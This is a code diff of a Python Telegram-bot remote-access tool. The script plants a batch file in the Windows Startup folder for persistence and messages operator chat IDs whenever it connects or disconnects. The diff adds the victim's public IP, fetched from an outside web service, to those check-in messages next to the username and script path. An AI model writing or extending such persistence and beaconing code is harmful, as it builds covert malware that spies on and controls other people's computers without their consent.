@@ -2,6 +2,7 @@ from telebot import TeleBot
 from os import getlogin
 from os.path import dirname, realpath
 from sys import argv
+from requests import get
 file_path = dirname(realpath(argv[0]))
 bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getlogin()
 with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
@@ -31,12 +32,12 @@ def main(message):
 					pass
 for id in ADMIN.values():
 	try:
-		bot.send_message(id, 'Connected with: {n}\nUsername: {l}'.format(n=argv[0], l=getlogin()))
+		bot.send_message(id, 'Connected with: {n}\nUsername: {l}\nIP: {ip}'.format(n=argv[0], l=getlogin(), ip=get("https://ramziv.com/ip").text))
 	except Exception:
 		pass
 bot.polling()
 for id in ADMIN.values():
 	try:
-		bot.send_message(id, 'Disconnected with: {n}\nUsername: {l}'.format(n=argv[0], l=getlogin()))
+		bot.send_message(id, 'Disconnected with: {n}\nUsername: {l}\nIP: {ip}'.format(n=argv[0], l=getlogin(), ip=get("https://ramziv.com/ip").text))
 	except Exception:
 		pass
